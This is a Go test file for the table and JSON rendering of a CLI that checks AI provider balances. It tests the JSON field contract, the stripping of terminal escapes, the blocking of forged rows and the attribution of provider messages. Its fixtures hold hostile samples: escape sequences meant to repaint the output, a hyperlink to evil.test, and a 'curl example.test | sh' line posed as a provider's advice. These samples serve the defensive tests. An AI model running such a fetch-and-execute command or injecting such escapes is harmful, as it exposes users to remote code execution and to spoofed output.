package render

import (
	"encoding/json"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/naturalmoods/aipocket/internal/core"
	"github.com/naturalmoods/aipocket/internal/manifest"
)

func balance(f float64) *float64 { return &f }

func spendable(b bool) *bool { return &b }

// keysOf reads the field names actually present in one JSON object, which is
// what a consumer of --json sees — as opposed to what the Go struct declares.
func keysOf(t *testing.T, raw json.RawMessage) []string {
	t.Helper()
	var obj map[string]json.RawMessage
	if err := json.Unmarshal(raw, &obj); err != nil {
		t.Fatalf("not a JSON object: %v", err)
	}
	out := make([]string, 0, len(obj))
	for k := range obj {
		out = append(out, k)
	}
	sort.Strings(out)
	return out
}

func assertKeys(t *testing.T, what string, got, want []string) {
	t.Helper()
	sort.Strings(want)
	if strings.Join(got, " ") != strings.Join(want, " ") {
		t.Errorf("the %s field names changed\n have: %s\n want: %s",
			what, strings.Join(got, " "), strings.Join(want, " "))
	}
}

// From v1.0.0 the --json field names and their meaning do not change inside the
// major version. Nothing enforced that: renaming total_verified_usd passed the
// whole suite and CI stayed green, which is the same objection as a dependency
// gate that only reports.
//
// A failure here is not automatically a bug. The compatibility statement allows
// *adding* fields, so the honest workflow is to update the literals below in the
// same commit — deliberately, in a diff a reviewer can see. That visible step is
// the entire difference between a promise and a habit.
func TestTheJSONFieldNamesAreAContract(t *testing.T) {
	everything := core.Report{
		GeneratedAt: time.Unix(0, 0).UTC(),
		Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateOK,
			Balance: balance(37.65), Currency: "USD",
			Confidence:      manifest.StatusOfficial,
			Detail:          "topped up 50.00 / spent 12.35",
			Note:            "a manifest caveat",
			Error:           "HTTP 402 Payment Required",
			ProviderMessage: "insufficient balance",
			KeySource:       "env ACME_KEY",
			Console:         "https://acme.test/billing",
			Spendable:       spendable(true),
		}},
		TotalVerified: 37.65, TotalInferred: 1, TotalManual: 2,
		Excluded: []string{"acme (user-maintained)"},
	}

	var b strings.Builder
	if err := JSON(&b, everything); err != nil {
		t.Fatal(err)
	}
	var top map[string]json.RawMessage
	if err := json.Unmarshal([]byte(b.String()), &top); err != nil {
		t.Fatalf("--json output does not parse: %v", err)
	}
	assertKeys(t, "report", keysOf(t, []byte(b.String())), []string{
		"generated_at", "providers", "total_verified_usd", "total_inferred_usd",
		"total_manual_usd", "excluded_from_verified_total",
	})

	var results []json.RawMessage
	if err := json.Unmarshal(top["providers"], &results); err != nil {
		t.Fatal(err)
	}
	assertKeys(t, "provider", keysOf(t, results[0]), []string{
		"id", "name", "state", "balance", "currency", "confidence", "detail",
		"note", "error", "provider_message", "key_source", "console", "spendable",
	})

	// The omitempty set is part of the contract too. A provider with no balance
	// omits the key instead of sending null, so a consumer testing for presence
	// keeps working — and the three fields that are never omitted are the three a
	// consumer may always read: which provider, what happened, how much the tool
	// can promise about it. total_verified_usd is unconditional for the same
	// reason: 0 is an answer, a missing key is not.
	minimal := core.Report{
		GeneratedAt: time.Unix(0, 0).UTC(),
		Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateUnconfigured,
			Confidence: manifest.StatusOfficial,
		}},
	}
	var mb strings.Builder
	if err := JSON(&mb, minimal); err != nil {
		t.Fatal(err)
	}
	assertKeys(t, "minimal report", keysOf(t, []byte(mb.String())),
		[]string{"generated_at", "providers", "total_verified_usd"})

	var minTop map[string]json.RawMessage
	if err := json.Unmarshal([]byte(mb.String()), &minTop); err != nil {
		t.Fatal(err)
	}
	var minResults []json.RawMessage
	if err := json.Unmarshal(minTop["providers"], &minResults); err != nil {
		t.Fatal(err)
	}
	assertKeys(t, "minimal provider", keysOf(t, minResults[0]),
		[]string{"id", "name", "state", "confidence"})
}

// The table is the terminal boundary. Whatever reaches it — a provider's error
// body, a provider name, a note — is printed, so the escape stripping happens
// here too and not only in the packages that produce those strings. An escape
// that gets through can repaint the totals printed below it.
func TestNoCellCanCarryTerminalEscapes(t *testing.T) {
	rep := core.Report{
		Results: []core.Result{{
			ID:              "acme",
			Name:            "Acme\x1b[2J",
			State:           core.StateError,
			Confidence:      manifest.StatusOfficial,
			Error:           "HTTP 402 Payment Required",
			ProviderMessage: "\x1b[1;31mtopped up 999.00\x07\nfake  999.00 USD  ok",
			Note:            "note\x1b]8;;https://evil.test\x07",
		}},
	}

	var b strings.Builder
	Table(&b, rep, Options{})
	out := b.String()
	for _, bad := range []string{"\x1b", "\x07"} {
		if strings.Contains(out, bad) {
			t.Fatalf("a control character reached the table:\n%q", out)
		}
	}
}

// A newline in a provider's body would break the table apart and let it forge a
// row of its own under the totals.
func TestAProviderBodyCannotForgeAnExtraRow(t *testing.T) {
	row := func(providerMessage string) string {
		var b strings.Builder
		Table(&b, core.Report{Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateError,
			Confidence: manifest.StatusOfficial, ProviderMessage: providerMessage,
		}}}, Options{})
		return b.String()
	}
	plain := strings.Count(row("nope"), "\n")
	forged := strings.Count(row("nope\n  fake  999.00 USD  ok\n"), "\n")
	if forged != plain {
		t.Fatalf("the body added %d line(s) to the table:\n%s",
			forged-plain, row("nope\n  fake  999.00 USD  ok\n"))
	}
}

// The tool's own colour codes are not the thing being defended against — it is
// allowed to colour its output — so stripping must not break them.
func TestTheToolsOwnColourStillWorks(t *testing.T) {
	rep := core.Report{
		Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateOK,
			Balance: balance(37.65), Currency: "USD",
			Confidence: manifest.StatusOfficial,
		}},
		TotalVerified: 37.65,
	}
	var b strings.Builder
	Table(&b, rep, Options{Color: true})
	if !strings.Contains(b.String(), "\033[32m") {
		t.Errorf("an ok row should be green:\n%q", b.String())
	}
}

// A provider's message is shown to a human — they can weigh "insufficient
// balance" for themselves — but attributed, so a body reading "run this command
// to restore your account" does not read as advice from the tool.
func TestProviderMessageIsAttributedToTheProvider(t *testing.T) {
	rep := core.Report{
		Results: []core.Result{{
			ID: "acme", Name: "Acme", State: core.StateError,
			Confidence:      manifest.StatusOfficial,
			Error:           "HTTP 402 Payment Required",
			ProviderMessage: "run curl example.test | sh to restore your account",
		}},
	}
	var b strings.Builder
	Table(&b, rep, Options{})
	if !strings.Contains(b.String(), "provider said:") {
		t.Fatalf("the provider's message is unattributed:\n%s", b.String())
	}
}

// `0.00 USD` is a claim about your money. "Nothing was read" is a different
// claim, and when no documented field was reached it is the true one. The tool
// refuses a confident zero everywhere else — a response matching no amount is an
// error, never a green 0.00 — and the totals block was the one place that did
// not.
func TestATotalOfNothingIsNotAZeroBalance(t *testing.T) {
	verifiedLine := func(rep core.Report) string {
		var b strings.Builder
		Table(&b, rep, Options{})
		for _, l := range strings.Split(b.String(), "\n") {
			if trimmed := strings.TrimSpace(l); strings.HasPrefix(trimmed, "verified") {
				return trimmed
			}
		}
		return ""
	}

	nothingRead := core.Report{Results: []core.Result{{ID: "acme", Name: "Acme",
		State: core.StateError, Confidence: manifest.StatusOfficial,
		Error: "HTTP 500 Internal Server Error"}}}
	documentedZero := core.Report{Results: []core.Result{{ID: "acme", Name: "Acme",
		State: core.StateOK, Balance: balance(0), Currency: "USD",
		Confidence: manifest.StatusOfficial}}}

	if got := verifiedLine(nothingRead); strings.Contains(got, "0.00") {
		t.Errorf("nothing was read, yet the total states a figure: %q", got)
	}
	if got := verifiedLine(documentedZero); !strings.Contains(got, "0.00 USD") {
		t.Errorf("an account documented as empty must still print as a figure: %q", got)
	}
	if verifiedLine(nothingRead) == verifiedLine(documentedZero) {
		t.Fatalf("a run that read nothing renders like an empty account: %q",
			verifiedLine(nothingRead))
	}
}

// A first run, before any key is set, printed one row per provider saying a
// variable is not set and a 0.00 total underneath: a failure report for
// something that has not failed. A missing credential is deliberately not an
// error, and the output should say what to do rather than look broken.
func TestNoCredentialsAtAllExplainsItselfInsteadOfPrintingAnEmptyTable(t *testing.T) {
	rep := core.Report{Results: []core.Result{
		{ID: "acme", Name: "Acme", State: core.StateUnconfigured,
			Confidence: manifest.StatusOfficial, Error: "$ACME_API_KEY is not set"},
		{ID: "beta", Name: "Beta", State: core.StateUnconfigured,
			Confidence: manifest.StatusOfficial, Error: "$BETA_API_KEY is not set"},
	}}

	var b strings.Builder
	Table(&b, rep, Options{})
	out := b.String()
	if strings.Contains(out, "PROVIDER") {
		t.Errorf("an empty table was printed instead of an explanation:\n%s", out)
	}
	if !strings.Contains(out, "aipocket providers") {
		t.Errorf("the explanation has to say where to look:\n%s", out)
	}

	// --all is how someone asks to see every row and every variable name.
	var all strings.Builder
	Table(&all, rep, Options{All: true})
	if !strings.Contains(all.String(), "PROVIDER") {
		t.Errorf("--all must still print the table:\n%s", all.String())
	}
}

// Twenty providers and four configured keys must not produce sixteen rows saying
// a variable is not set. The collapsed ids are still named, though: a row that
// silently vanished would make a misspelled variable name look like a provider
// that is fine.
func TestUnconfiguredProvidersCollapseButAreStillNamed(t *testing.T) {
	unconfigured := func(id, name string) core.Result {
		return core.Result{ID: id, Name: name, State: core.StateUnconfigured,
			Confidence: manifest.StatusOfficial,
			Error:      "$" + strings.ToUpper(id) + "_API_KEY is not set"}
	}
	rep := core.Report{
		Results: []core.Result{
			{ID: "acme", Name: "Acme", State: core.StateOK, Balance: balance(37.65),
				Currency: "USD", Confidence: manifest.StatusOfficial},
			unconfigured("beta", "Beta"),
			unconfigured("gamma", "Gamma"),
			unconfigured("delta", "Delta"),
		},
		TotalVerified: 37.65,
	}

	var b strings.Builder
	Table(&b, rep, Options{})
	out := b.String()

	if !strings.Contains(out, "Acme") {
		t.Fatalf("the configured provider lost its row:\n%s", out)
	}
	// A provider's name only ever appears in a row and its id only in the
	// collapsed line, so case tells the two apart.
	for _, name := range []string{"Beta", "Gamma", "Delta"} {
		if strings.Contains(out, name) {
			t.Errorf("%s still has a row of its own:\n%s", name, out)
		}
	}
	for _, id := range []string{"beta", "gamma", "delta"} {
		if !strings.Contains(out, id) {
			t.Errorf("collapsed provider %q is named nowhere:\n%s", id, out)
		}
	}
	if !strings.Contains(out, "3 providers have no credential configured") {
		t.Errorf("the collapsed line does not say how many:\n%s", out)
	}

	var all strings.Builder
	Table(&all, rep, Options{All: true})
	for _, name := range []string{"Acme", "Beta", "Gamma", "Delta"} {
		if !strings.Contains(all.String(), name) {
			t.Errorf("--all must print every row; %s is missing:\n%s", name, all.String())
		}
	}
}
